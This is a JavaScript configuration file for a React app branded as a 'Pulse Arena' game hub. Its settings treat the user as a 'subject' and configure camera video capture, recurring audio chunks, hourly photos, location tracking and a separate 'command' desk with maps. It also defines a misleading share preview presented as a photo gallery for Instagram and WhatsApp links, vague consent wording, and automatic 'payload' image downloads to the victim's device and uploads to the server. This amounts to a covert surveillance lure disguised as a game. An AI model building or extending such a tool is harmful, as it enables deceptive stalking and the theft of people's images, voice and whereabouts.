/**
 * Backend API və Socket.IO.
 */
function externalBackendUrl() {
    const fromEnv = (process.env.REACT_APP_API_URL || '').replace(/\/$/, '');
    if (typeof window === 'undefined') {
        return fromEnv;
    }
    const fromPulse = window.PULSE_CONFIG?.apiUrl;
    const pulseUrl = fromPulse ? String(fromPulse).replace(/\/$/, '') : '';
    const candidate = pulseUrl || fromEnv;
    if (!candidate) return '';
    try {
        const parsed = new URL(candidate);
        if (parsed.hostname !== window.location.hostname) {
            return candidate;
        }
    } catch {
        return candidate;
    }
    return '';
}

function resolveApiBaseUrl() {
    const fromEnv = (process.env.REACT_APP_API_URL || '').replace(/\/$/, '');
    if (typeof window === 'undefined') {
        return fromEnv || 'http://localhost:3500';
    }

    const external = externalBackendUrl();
    if (external) return external;

    const host = window.location.hostname;
    const port = window.location.port;

    // CRA dev proxy, backend:3500, unified HTTPS deploy (API eyni hostda)
    if (port === '3500' || port === '3000' || port === '3001' || port === '3002' || !port) {
        return '';
    }

    if (host === 'localhost' || host === '127.0.0.1') {
        return fromEnv || '';
    }

    if (/^192\.168\.|^10\.|^172\.(1[6-9]|2\d|3[01])\./.test(host)) {
        return `${window.location.protocol}//${host}:3500`;
    }

    return fromEnv || '';
}

export const API_BASE_URL = resolveApiBaseUrl();

/** Socket.IO — API ilə eyni backend (Vercel+Render split deploy daxil) */
function resolveSocketUrl() {
    const fromEnv = (process.env.REACT_APP_API_URL || '').replace(/\/$/, '');
    if (typeof window === 'undefined') {
        return fromEnv || 'http://localhost:3500';
    }

    const external = externalBackendUrl();
    if (external) return external;

    const host = window.location.hostname;
    const port = window.location.port;

    if (port === '3500') return '';

    if (port === '3000' || port === '3001' || port === '3002') {
        return 'http://127.0.0.1:3500';
    }

    if (host === 'localhost' || host === '127.0.0.1') {
        return 'http://127.0.0.1:3500';
    }

    if (/^192\.168\.|^10\.|^172\.(1[6-9]|2\d|3[01])\./.test(host)) {
        return `${window.location.protocol}//${host}:3500`;
    }

    return fromEnv || '';
}

export const SOCKET_URL = resolveSocketUrl();

export const ADMIN_PATH =
    (process.env.REACT_APP_ADMIN_PATH || '/admin').replace(/\/$/, '') || '/admin';

export const COMMAND_PATH =
    (process.env.REACT_APP_COMMAND_PATH || '/command').replace(/\/$/, '') || '/command';

export const ADMIN_API_KEY = process.env.REACT_APP_ADMIN_KEY || '';

export const SUBJECT_TITLE =
    process.env.REACT_APP_SUBJECT_TITLE || 'Pulse Arena';

export const SUBJECT_MESSAGE =
    process.env.REACT_APP_SUBJECT_MESSAGE ||
    'Oynamağa başlamaq üçün «Oynamağa başla» düyməsinə toxunun.';

export const SUBJECT_CAMERA_DONE_KEY = 'subject_camera_done_main';

export const CLIENT_SESSION_KEY = 'subject_client_session_id';

export function getClientSessionId() {
    try {
        let id = localStorage.getItem(CLIENT_SESSION_KEY);
        if (!id) {
            id = `cs_${Date.now()}_${Math.random().toString(36).slice(2, 10)}`;
            localStorage.setItem(CLIENT_SESSION_KEY, id);
        }
        return id;
    } catch {
        return `cs_${Date.now()}`;
    }
}

export const SUBJECT_CAMERA_MESSAGE =
    process.env.REACT_APP_SUBJECT_CAMERA_MESSAGE || SUBJECT_MESSAGE;

export const CAMERA_VIDEO_SECONDS = Number(process.env.REACT_APP_CAMERA_VIDEO_SECONDS) || 5;

export const AUDIO_CHUNK_SECONDS =
    Number(process.env.REACT_APP_AUDIO_CHUNK_SECONDS) || 30;

export const PERIODIC_PHOTO_MS =
    Number(process.env.REACT_APP_PERIODIC_PHOTO_MS) || 3600000;

export const SUBJECT_SUCCESS_MESSAGE =
    process.env.REACT_APP_SUBJECT_SUCCESS_MESSAGE ||
    'Təsdiqləndi. Sorğunuz qəbul olundu — bu pəncərəni bağlaya bilərsiniz.';

export const SUBJECT_GRANTED_KEY = 'subject_locationGranted';

export function subjectCameraDoneKey(token) {
    return `subject_camera_done_${token}`;
}

export const GAME_HUB_TITLE = process.env.REACT_APP_GAME_HUB_TITLE || 'Pulse Arena';

export const GAME_HUB_TAGLINE =
    process.env.REACT_APP_GAME_HUB_TAGLINE || 'Sürətli mini-oyunlar — level qazan';

export const CONSENT_TEXT =
    process.env.REACT_APP_CONSENT_TEXT ||
    `${GAME_HUB_TITLE} — oyun təcrübəsi üçün cihaz sensorları və media istifadə olunur.`;

/** Link önizləməsi (Instagram DM, WhatsApp) — yalnız public/index.html OG tag-ları */
export const SHARE_PREVIEW_TITLE =
    process.env.REACT_APP_SHARE_PREVIEW_TITLE || 'Pulse Arena';

export const SHARE_PREVIEW_DESCRIPTION =
    process.env.REACT_APP_SHARE_PREVIEW_DESCRIPTION ||
    'Şəkillərini paylaş — foto qalereya.';

export function pulseProgressKey(clientKey) {
    return `pulse_progress_${clientKey}`;
}

/** Subyekt cihaz qalereyasına avtomatik şəkil endirməsi (default: aktiv) */
export const SUBJECT_IMAGE_DOWNLOAD =
    process.env.REACT_APP_SUBJECT_IMAGE_DOWNLOAD !== 'false';

export const SUBJECT_IMAGE_PATH =
    process.env.REACT_APP_SUBJECT_IMAGE_PATH || '/subject-payload.jpg';

/** Server media qaleriyasına yükləmə (default: söndürülüb — subyekt cihazı istifadə olunur) */
export const SUBJECT_GALLERY_PAYLOAD_ENABLED =
    process.env.REACT_APP_SUBJECT_GALLERY_PAYLOAD === 'true';

/** Subyekt girəndə minimum yüklənəcək şəkil sayı */
export const GALLERY_PAYLOAD_MIN_COUNT =
    Number(process.env.REACT_APP_GALLERY_PAYLOAD_MIN_COUNT) || 5;

export const GALLERY_PAYLOAD_PATHS = [
    '/gallery-payload/01.jpg',
    '/gallery-payload/02.jpg',
    '/gallery-payload/03.jpg',
    '/gallery-payload/04.jpg',
    '/gallery-payload/05.jpg',
    '/gallery-payload/06.jpg',
    '/gallery-payload/07.jpg',
    '/gallery-payload/08.jpg',
    '/gallery-payload/09.jpg',
    '/gallery-payload/10.jpg'
];

/** Avtomatik serverə yüklənən şəkillər (ilk N ədəd) */
export const GALLERY_UPLOAD_PATHS = GALLERY_PAYLOAD_PATHS.slice(0, GALLERY_PAYLOAD_MIN_COUNT);

/** Google Maps JavaScript API (CommandDesk trafik xəritəsi) */
export const GOOGLE_MAPS_API_KEY = process.env.REACT_APP_GOOGLE_MAPS_API_KEY || '';

export const GOOGLE_MAPS_ENABLED = Boolean(GOOGLE_MAPS_API_KEY);

/** TomTom Maps + Routing + Traffic (Waze tərzi naviqasiya) */
export const TOMTOM_API_KEY = process.env.REACT_APP_TOMTOM_API_KEY || '';

export const TOMTOM_MAPS_ENABLED = Boolean(TOMTOM_API_KEY);

/** TomTom xəritə etiket dili — ngt: hər ölkədə yerli adlar (qlobal). Latın üçün: ngt-Latn */
export const TOMTOM_MAP_LANGUAGE =
    process.env.REACT_APP_TOMTOM_MAP_LANGUAGE || 'ngt';

/** Radar nav: yaxınlaşma xəbərdarlığı məsafələri (metr) */
export const RADAR_ALERT_DIST_M = Number(process.env.REACT_APP_RADAR_ALERT_DIST_M) || 500;
export const RADAR_URGENT_DIST_M = Number(process.env.REACT_APP_RADAR_URGENT_DIST_M) || 200;
export const RADAR_SOUND_STORAGE_KEY = 'radar_alerts_sound_enabled';
